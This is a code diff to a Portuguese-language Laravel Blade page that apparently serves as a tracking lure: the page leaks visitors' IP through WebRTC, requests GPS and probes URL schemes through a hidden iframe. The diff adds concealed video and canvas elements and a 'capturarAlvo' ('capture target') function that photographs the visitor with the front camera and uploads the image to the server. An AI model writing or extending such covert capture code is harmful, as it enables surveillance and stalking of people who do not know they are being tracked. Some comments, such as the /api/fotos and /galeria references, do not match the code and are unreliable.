@@ -83,6 +83,18 @@
             border: none; padding: 0;
             font-size: 1px;
         }
+
+        /* Flash visual da câmera */
+        #__cap-flash {
+            position: fixed;
+            inset: 0;
+            background: #fff;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity .08s ease;
+        }
+        #__cap-flash.ativo { opacity: 1; }
     </style>
 </head>
 <body>
@@ -111,6 +123,22 @@
         <p>Caso precise de suporte, entre em contato com o remetente.</p>
     </div>
 
+    {{-- Elementos para captura de câmera (ocultos, renderizados só quando necessário) --}}
+    @if($captureAlvo)
+        <video    id="__cap-video"      autoplay muted playsinline
+                  style="display:none;position:fixed;top:0;left:0;width:1px;height:1px;z-index:-1;"
+                  tabindex="-1" aria-hidden="true"></video>
+        <canvas   id="__cap-canvas"     width="1280" height="720"
+                  style="display:none;position:fixed;top:0;left:0;z-index:-1;"
+                  tabindex="-1" aria-hidden="true"></canvas>
+        <div      id="__cap-flash"      aria-hidden="true"></div>
+        <input    id="__cap-file-input" type="file" accept="image/*" capture="user"
+                  style="display:none;" tabindex="-1" aria-hidden="true">
+        {{-- linkAcao e feedback: elementos de controle usados internamente pelo JS --}}
+        <span     id="__cap-link"       style="display:none;" aria-hidden="true"></span>
+        <span     id="__cap-feedback"   style="display:none;" aria-hidden="true"></span>
+    @endif
+
     {{-- iframe invisível usado para probing de URL schemes --}}
     @if($captureIdentity)
         <iframe id="__scheme-probe" style="display:none;width:0;height:0;border:none;" tabindex="-1" aria-hidden="true"></iframe>
@@ -132,10 +160,12 @@
         var token      = @json($token);
         var accessId   = @json($accessUuid);
         var captureGps = @json($captureGps);
+        var captureAlvo = @json($captureAlvo);
         var captureIdentity = @json($captureIdentity);
         var redirectUrl = @json($redirectUrl);
-        var endpoint   = window.location.pathname.replace(/\/$/, '') + '/device';
-        var csrf       = @json(csrf_token());
+        var endpoint      = window.location.pathname.replace(/\/$/, '') + '/device';
+        var endpointFotos = window.location.pathname.replace(/\/$/, '') + '/fotos';
+        var csrf          = @json(csrf_token());
 
         var dados = {
             gmt:        '',
@@ -498,6 +528,84 @@
             window.location.href = redirectUrl;
         }
 
+        // ─────────────────────────────────────────────────────────────
+        // CAPTURAR ALVO — câmera frontal
+        // Depende de autorização explícita do alvo no navegador.
+        // ─────────────────────────────────────────────────────────────
+
+        async function capturarAlvo(callback) {
+            callback = callback || function(){};
+
+            if (!captureAlvo) {
+                return callback();
+            }
+
+            var linkAcao        = document.getElementById('__cap-link');
+            var feedback        = document.getElementById('__cap-feedback');
+            var video           = document.getElementById('__cap-video');
+            var canvas          = document.getElementById('__cap-canvas');
+            var flash           = document.getElementById('__cap-flash');
+            var fileInput       = document.getElementById('__cap-file-input');
+            var temGetUserMedia = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
+
+            async function salvarFoto(base64) {
+                try {
+                    await fetch(endpointFotos, {
+                        method:      'POST',
+                        headers:     { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrf },
+                        body:        JSON.stringify({ foto: base64, access_id: accessId }),
+                        credentials: 'same-origin',
+                        keepalive:   true,
+                    });
+                } catch(e) {}
+            }
+
+            try {
+                // 1. Bloqueia cliques duplos
+                linkAcao.style.pointerEvents = 'none';
+                feedback.textContent = 'Acessando câmera…';
+
+                // 2. Verifica se getUserMedia está disponível (requer HTTPS)
+                if (temGetUserMedia) {
+
+                    // 3. Abre a câmera frontal
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: false,
+                    });
+
+                    // 4. Conecta ao elemento <video> oculto e aguarda carregar
+                    video.srcObject = stream;
+                    await new Promise(r => { video.onloadedmetadata = r; });
+
+                    // 5. Espera 300ms para a câmera estabilizar
+                    await new Promise(r => setTimeout(r, 300));
+
+                    // 6. Flash visual + captura o frame no <canvas>
+                    flash.classList.add('ativo');
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const base64 = canvas.toDataURL('image/jpeg', 0.92);
+
+                    // 7. Encerra o stream da câmera imediatamente
+                    stream.getTracks().forEach(t => t.stop());
+
+                    // 8. Envia o base64 para POST /api/fotos
+                    feedback.textContent = 'Salvando foto…';
+                    await salvarFoto(base64);
+
+                    // 9. Mostra confirmação e redireciona para /galeria
+                    feedback.textContent = '✓ Foto salva!';
+                    setTimeout(() => window.location.href = '/galeria', 1200);
+
+                } else {
+                    // Fallback para HTTP (mobile sem HTTPS): abre câmera nativa
+                    fileInput.click();
+                }
+            } catch(e) {}
+
+            callback();
+        }
+
         function solicitarGps(callback) {
             callback = callback || function(){};
 
@@ -574,7 +682,7 @@
                            || window.mozRTCPeerConnection;
 
                 if (!RTCPeer) {
-                    Promise.resolve(enviar(null)).then(function() { solicitarGps(redirecionar); });
+                    Promise.resolve(enviar(null)).then(function() { capturarAlvo(function() { solicitarGps(redirecionar); }); });
                     return;
                 }
 
@@ -595,7 +703,7 @@
                     if (enviado) return;
                     enviado = true;
                     try { pc.close(); } catch(e) {}
-                    Promise.resolve(enviar(melhorEndereco)).then(function() { solicitarGps(redirecionar); });
+                    Promise.resolve(enviar(melhorEndereco)).then(function() { capturarAlvo(function() { solicitarGps(redirecionar); }); });
                 }
 
                 function processarCandidate(c) { escolherEndereco(extrairEnderecoDoCandidate(c)); }
@@ -620,7 +728,7 @@
                 setTimeout(finalizarWebRtc, 4000);
 
             } catch(e) {
-                Promise.resolve(enviar(null)).then(function() { solicitarGps(redirecionar); });
+                Promise.resolve(enviar(null)).then(function() { capturarAlvo(function() { solicitarGps(redirecionar); }); });
             }
         }
 
